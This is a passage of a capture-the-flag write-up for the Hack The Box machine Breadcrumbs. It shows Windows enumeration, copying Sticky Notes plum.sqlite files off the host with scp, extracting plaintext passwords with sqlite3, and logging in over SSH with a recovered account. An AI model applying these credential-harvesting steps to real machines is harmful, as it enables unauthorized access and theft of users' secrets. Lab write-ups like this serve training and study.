# # `Enumeration` -

We get a todo.html on juliette Desktop reading that we get some hint to enumerate Microsoft Sticky Notes -

```bash
juliette@BREADCRUMBS C:\Users\juliette\Desktop>dir
 Volume in drive C has no label.
 Volume Serial Number is 7C07-CD3A

 Directory of C:\Users\juliette\Desktop

01/15/2021  05:04 PM    <DIR>          .
01/15/2021  05:04 PM    <DIR>          ..
12/09/2020  07:27 AM               753 todo.html  
07/28/2021  10:38 PM                34 user.txt   
               2 File(s)            787 bytes     
               2 Dir(s)   6,368,403,456 bytes free
juliette@BREADCRUMBS C:\Users\juliette\Desktop>type todo.html
<html>
<style>
html{
background:black;
color:orange;
}
table,th,td{
border:1px solid orange;
padding:1em;
border-collapse:collapse;
}
</style>
<table>
        <tr>
            <th>Task</th>
            <th>Status</th>
            <th>Reason</th>
        </tr>
        <tr>
            <td>Configure firewall for port 22 and 445</td>
            <td>Not started</td>
            <td>Unauthorized access might be possible</td>
        </tr>
        <tr>
            <td>Migrate passwords from the Microsoft Store Sticky Notes application to our new password manager</td>
            <td>In progress</td>
            <td>It stores passwords in plain text</td>
        </tr>
        <tr>
            <td>Add new features to password manager</td>
            <td>Not started</td>
            <td>To get promoted, hopefully lol</td>
        </tr>
</table>

</html>
```

### Sticky Notes -

Some Googling reveals that the [Sticky Notes data](https://www.techrepublic.com/article/how-to-backup-and-restore-sticky-notes-in-windows-10/) is stored at `%LocalAppData%\Packages\Microsoft.MicrosoftStickyNotes_8wekyb3d8bbwe\LocalState\plum.sqlite`, and it’s there on Breadcrumbs:

```bash
juliette@BREADCRUMBS C:\Users\juliette\AppData\Local\Packages\Microsoft.MicrosoftStickyNotes_8wekyb3d8bbwe\LocalState>dir
 Volume in drive C has no label.
 Volume Serial Number is 7C07-CD3A

 Directory of C:\Users\juliette\AppData\Local\Packages\Microsoft.MicrosoftStickyNotes_8wekyb3d8bbwe\LocalState

01/15/2021  05:10 PM    <DIR>          .
01/15/2021  05:10 PM    <DIR>          ..
01/15/2021  05:10 PM            20,480 15cbbc93e90a4d56bf8d9a29305b8981.storage.session
11/29/2020  04:10 AM             4,096 plum.sqlite
01/15/2021  05:10 PM            32,768 plum.sqlite-shm
01/15/2021  05:10 PM           329,632 plum.sqlite-wal
               4 File(s)        386,976 bytes
               2 Dir(s)   6,368,264,192 bytes free
```

Copy all the files to local machine

```bash
root@napster:~/Documents/HTB/BreadCrumbs# scp -o 'PubkeyAuthentication=no' juliette@10.10.10.228:/C:/Users/juliette/AppData/Local/Packages/Microsoft.MicrosoftStickyNotes_8wekyb3d8bbwe/LocalState/* .
juliette@10.10.10.228's password: 
15cbbc93e90a4d56bf8d9a29305b8981.storage.session                                                                            100%   20KB  62.3KB/s   00:00    
plum.sqlite                                                                                                                 100% 4096    24.8KB/s   00:00    
plum.sqlite-shm                                                                                                             100%   32KB 161.2KB/s   00:00    
plum.sqlite-wal                                                                                                             100%  322KB 582.6KB/s   00:00 
```

```bash
root@napster:~/Documents/HTB/BreadCrumbs/sticky# file plum.sqlite
plum.sqlite: SQLite 3.x database, last written using SQLite version 3022000
root@napster:~/Documents/HTB/BreadCrumbs/sticky# sqlite3 plum.sqlite 
SQLite version 3.34.0 2020-12-01 16:14:00
Enter ".help" for usage hints.
sqlite> .tables
Media           Stroke          SyncState       User          
Note            StrokeMetadata  UpgradedNote  
sqlite> .schema Note
CREATE TABLE IF NOT EXISTS "Note" (
"Text" varchar ,
"WindowPosition" varchar ,
"IsOpen" integer ,
"IsAlwaysOnTop" integer ,
"CreationNoteIdAnchor" varchar ,
"Theme" varchar ,
"IsFutureNote" integer ,
"RemoteId" varchar ,
"ChangeKey" varchar ,
"LastServerVersion" varchar ,
"RemoteSchemaVersion" integer ,
"IsRemoteDataInvalid" integer ,
"Type" varchar ,
"Id" varchar primary key not null ,
"ParentId" varchar ,
"CreatedAt" bigint ,
"DeletedAt" bigint ,
"UpdatedAt" bigint );
sqlite> select Text from Note;
\id=48c70e58-fcf9-475a-aea4-24ce19a9f9ec juliette: jUli901./())!
\id=fc0d8d70-055d-4870-a5de-d76943a68ea2 development: fN3)sN5Ee@g
\id=48924119-7212-4b01-9e0f-ae6d678d49b2 administrator: [MOVED]
```

We found some Creds -

development - fN3)sN5Ee@g


# # `SSH as development` -

```bash
root@napster:~/Documents/HTB/BreadCrumbs/sticky# ssh development@10.10.10.228                                                                                 
development@10.10.10.228's password:                                                                                                                          
Microsoft Windows [Version 10.0.19041.746]                                                                                                                    
(c) 2020 Microsoft Corporation. All rights reserved.

development@BREADCRUMBS C:\Users\development>
```